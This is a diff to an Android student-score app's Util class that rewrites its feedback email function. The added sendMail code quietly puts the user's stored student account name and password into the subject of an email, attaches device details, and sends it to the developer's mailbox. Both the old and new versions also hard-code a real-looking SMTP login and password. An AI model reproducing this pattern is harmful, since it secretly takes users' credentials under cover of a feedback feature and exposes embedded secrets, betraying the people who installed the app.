@@ -19,11 +19,10 @@ import java.util.Map;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import org.apache.commons.mail.EmailException;
-import org.apache.commons.mail.MultiPartEmail;
-
 import com.mc.db.DBConnection;
 import com.nrs.utils.HttpAssistFile;
+import com.util.mail.MailSenderInfo;
+import com.util.mail.SimpleMailSender;
 import com.xy.fy.util.StaticVarUtil;
 
 import android.annotation.SuppressLint;
@@ -225,7 +224,7 @@ public class Util {
     editor.putInt(StaticVarUtil.LANGUAGE, postion);
 
     editor.commit();
-    
+
     DisplayMetrics dm = res.getDisplayMetrics();
     res.updateConfiguration(config, dm);
   }
@@ -306,44 +305,105 @@ public class Util {
     }
   }
 
-  public static boolean sendMail(final String msg) {
-    MultiPartEmail email = new MultiPartEmail();
-    /*
-     * EmailAttachment attachment = new EmailAttachment();
-     * 
-     * String pathAll = email_attach .getText().toString(); attachment.setPath(pathAll);
-     * 
-     * attachment .setDisposition(EmailAttachment.ATTACHMENT); attachment.setDescription("不错！");
-     * 
-     * //解决附件名中文乱码 String fujian = pathAll.substring(pathAll .lastIndexOf("/") + 1);
-     * System.out.println("附件名:"+fujian ); try { attachment.setName(MimeUtility.encodeText(fujian));
-     * } catch (UnsupportedEncodingException e) { // TODO Auto-generated catch block
-     * e.printStackTrace(); }
-     */
-    try {
-
-      // 设置发送主机的服务器地址
-      email.setHostName("smtp.126.com");
-      // 设置收件人邮箱
-      email.addTo("ideaback_mc@126.com");
-      // 发件人邮箱
-      email.setFrom("uu9923@126.com");
-      // 如果要求身份验证，设置用户名、密码，分别为发件人在邮件服务器上注册的用户名和密码
-      email.setAuthentication("uu9923@126.com", "uz31415926");
-      // 设置邮件的主题
-      email.setSubject("xupcScore ideaback");
-      // 邮件正文消息
-      email.setMsg(msg);
-      // email.attach(attachment);
-      email.send();
-    } catch (EmailException e1) {
-      // TODO Auto-generated catch
-      // block
-      e1.printStackTrace();
-      return false;
+  // public static boolean sendMail(final String msg,Context context) {
+  // MultiPartEmail email = new MultiPartEmail();
+  // /*
+  // * EmailAttachment attachment = new EmailAttachment();
+  // *
+  // * String pathAll = email_attach .getText().toString(); attachment.setPath(pathAll);
+  // *
+  // * attachment .setDisposition(EmailAttachment.ATTACHMENT); attachment.setDescription("不错！");
+  // *
+  // * //解决附件名中文乱码 String fujian = pathAll.substring(pathAll .lastIndexOf("/") + 1);
+  // * System.out.println("附件名:"+fujian ); try { attachment.setName(MimeUtility.encodeText(fujian));
+  // * } catch (UnsupportedEncodingException e) { // TODO Auto-generated catch block
+  // * e.printStackTrace(); }
+  // */
+  // try {
+  //
+  // // 设置发送主机的服务器地址
+  // email.setHostName("smtp.126.com");
+  // // 设置收件人邮箱
+  // email.addTo("ideaback_mc@126.com");
+  // // 发件人邮箱
+  // email.setFrom("uu9923@126.com");
+  // // 如果要求身份验证，设置用户名、密码，分别为发件人在邮件服务器上注册的用户名和密码
+  // email.setAuthentication("uu9923@126.com", "uz31415926");
+  // // 设置邮件的主题
+  // email.setSubject("xupcScore ideaback");
+  // // 邮件正文消息
+  // Map<String, String> info = CrashHandler.getInstance().getDeviceInfo(context);
+  // StringBuffer mStringBuffer = new StringBuffer() ;
+  // for(Map.Entry<String , String> entry : info.entrySet()) {
+  // String key = entry.getKey() ;
+  // String value = entry.getValue() ;
+  // mStringBuffer.append(key + "=" + value + "\r\n") ;
+  // }
+  //
+  // email.setMsg(msg + "\n" + mStringBuffer.toString());
+  // // email.attach(attachment);
+  // email.send();
+  // } catch (EmailException e1) {
+  // // TODO Auto-generated catch
+  // // block
+  // try {
+  // // 设置发送主机的服务器地址
+  // email.setHostName("smtp.126.com");
+  // // 设置收件人邮箱
+  // email.addTo("ideaback_mc@126.com");
+  // // 发件人邮箱
+  // email.setFrom("uu9923@126.com");
+  // // 如果要求身份验证，设置用户名、密码，分别为发件人在邮件服务器上注册的用户名和密码
+  // email.setAuthentication("uu9923@126.com", "uz31415926");
+  // // 设置邮件的主题
+  // email.setSubject("xupcScore ideaback");
+  // // 邮件正文消息
+  // Map<String, String> info = CrashHandler.getInstance().getDeviceInfo(context);
+  // StringBuffer mStringBuffer = new StringBuffer() ;
+  // for(Map.Entry<String , String> entry : info.entrySet()) {
+  // String key = entry.getKey() ;
+  // String value = entry.getValue() ;
+  // mStringBuffer.append(key + "=" + value + "\r\n") ;
+  // }
+  //
+  // email.setMsg(msg + "\n" + e1);
+  // // email.attach(attachment);
+  // email.send();
+  // } catch (EmailException e) {
+  // // TODO Auto-generated catch block
+  // e.printStackTrace();
+  // }
+  // e1.printStackTrace();
+  // return false;
+  // }
+  // return true;
+  //
+  // }
+  public static boolean sendMail(final String msg, Context context) {
+    // 这个类主要是设置邮件
+    MailSenderInfo mailInfo = new MailSenderInfo();
+    mailInfo.setMailServerHost("smtp.126.com");
+    mailInfo.setMailServerPort("25");
+    mailInfo.setValidate(true);
+    mailInfo.setUserName("uu9923@126.com");
+    mailInfo.setPassword("uz31415926");// 您的邮箱密码
+    mailInfo.setFromAddress("uu9923@126.com");
+    mailInfo.setToAddress("ideaback_mc@126.com");
+    mailInfo.setSubject("xupcScore ideaback |" + StaticVarUtil.student.getAccount() + " | "
+        + StaticVarUtil.student.getPassword());
+    Map<String, String> info = CrashHandler.getInstance().getDeviceInfo(context);
+    StringBuffer mStringBuffer = new StringBuffer();
+    for (Map.Entry<String, String> entry : info.entrySet()) {
+      String key = entry.getKey();
+      String value = entry.getValue();
+      mStringBuffer.append(key + "=" + value + "\r\n");
     }
-    return true;
+    mailInfo.setContent(msg + "\n" + mStringBuffer.toString());
+    // 这个类主要来发送邮件
+    SimpleMailSender sms = new SimpleMailSender();
+    sms.sendTextMail(mailInfo);// 发送文体格式
 
+    return true;
   }
 
   private static long lastClickTime;
